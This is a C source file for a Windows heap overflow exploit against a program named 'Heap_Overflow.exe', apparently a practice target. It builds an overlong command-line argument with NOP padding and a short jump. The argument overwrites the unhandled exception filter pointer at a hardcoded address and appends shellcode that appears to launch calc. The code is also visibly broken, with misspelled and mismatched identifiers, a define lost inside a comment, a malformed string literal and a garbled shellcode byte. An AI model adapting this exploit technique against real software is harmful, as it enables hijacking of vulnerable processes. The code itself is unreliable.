//explotis using heap overflow.
// the task of this exploit is change address to unhandled exception filter  on dword ptr[edi+0x74] 
//owing to hakcer get control over application


#include<windows.h>
#include<stdio.h>
#include<conio.h>

//path to application with flow
#define BAD_APP "Heap_Overflow.exe\"



//path to unhandled exception filer#define UEF_PTR_ADDR 0x77ED73B4
//path to instruction dword ptr[edi+0x74] 
//edi has EXCEPTION_POINTER struction
//0x74 behind this addres is the buffor's end address on the heap
#define NETAPI_ADDR 0x77C3BBAD



//shellcode in hesydecimal form
unsigned char shellcode[]
{
	0x6A,0x05,0xC7,0x04,0x24,0x63,0x61,0x6C,0x63,0x33,0xC9,
	0x89,0x4C,0x24,0x04,0x54,0x68,0xFD,0x98,0xE7,0x77,0xB8,
	0,35,0xFD,0xE6,0x77,0xFF,0xE0
};
int main(void)
{
	int i;
	
	STARTUPINFO si;
	
	PROCESS_INFORMATION pi;
	
	char exploit_data[1024];
	
	//set variables
	memset(&si,0,sizeof(STARUPINFO));
	memset(&pi,0,sizeof(PROCESS_INFORMATION));
	memset((void*)exploit_data,0,sizeof(exploit_data));
	
	//prepares of entrance chain
	i=strlen(BAD_APP);
	memcpy((void*)&exploit_data,BAD_APP,i);
	
	//overwrite the buffor
	memset((void*)&exploit_data[i],0x90,16+8);
	i+=16+8;
	
	//forehead jump
	*(WORD*)&exploit_data[i-2]=0x08EB;
	*(DWORD*)&exploit_data[i]=NETAPPI_ADDR;
	*(DWORD*)&exploit_data[i+4]=UEF_PTR_ADDR;
	i+=8;
	
	//add shellcode
	memcpy((void*)&exploit_data[i],(void*)&shellcode,sizeof(shellcode));
	i+=sizeof(shellcode);
	
	exploit_data[i]='"';
	
	if(CreateProcess(NULL,(char*)&exploit_data,NULL,NULL,False,0,NULL,NULL,&si,&pi)==NULL)
	{
		printf("ERROR proccess can not be launch");
		getch();
		return -1;
	}
	
	WaitForSingleObject(pi.hProcess,INIFINITE);
	
	CloseHandle(pi.hProcess);
	Closehandle(pi.hThread);
	return 0;
}
